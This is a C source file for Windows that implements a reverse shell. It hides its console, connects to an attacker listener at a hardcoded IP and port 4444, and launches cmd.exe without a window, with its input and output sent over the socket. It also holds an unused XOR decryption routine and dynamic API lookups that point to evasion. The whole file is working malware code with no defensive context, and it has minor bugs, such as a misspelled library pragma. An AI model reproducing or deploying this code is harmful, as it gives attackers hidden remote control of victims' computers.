#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")

WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;
BOOL(WINAPI *pCreateProcess)( 
LPCWSTR lpszImageName, 
LPCWSTR lpszCmdLine, 
LPSECURITY_ATTRIBUTES lpsaProcess, 
LPSECURITY_ATTRIBUTES lpsaThread, 
BOOL fInheritHandles, 
DWORD fdwCreate, 
LPVOID lpvEnvironment, 
LPWSTR lpszCurDir, 
LPSTARTUPINFOW lpsiStartInfo, 
LPPROCESS_INFORMATION lppiProcInfo);

//to  Decrypt Xor 
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}
int(WINAPI * pWSAStartup)
(
  WORD      wVersionRequired,
  LPWSADATA lpWSAData
);

int main(void)
{
    FreeConsole();
  // listener ip, port on attacker's machine
  char *ip = "192.168.47.130";
  short port = 4444;

  
  
//   pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), SVirtualProtect);


  // init socket lib
  WSAStartup(MAKEWORD(2, 2), &wsaData);

  // create socket
  wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  hax.sin_family = AF_INET;
  hax.sin_port = htons(port);
  hax.sin_addr.s_addr = inet_addr(ip);

  // connect to remote host
  WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

  memset(&sui, 0, sizeof(sui));
  sui.cb = sizeof(sui);
  sui.dwFlags = STARTF_USESTDHANDLES;
  sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;

    // pCreateProcess = GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateProcess");
  // start cmd.exe with redirected streams
   HMODULE hModule         = LoadLibraryA( "kernel32.dll" );
  FARPROC pCreateProcess       = GetProcAddress( hModule, "CreateProcess" );
  CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sui, &pi);

  exit(0);
}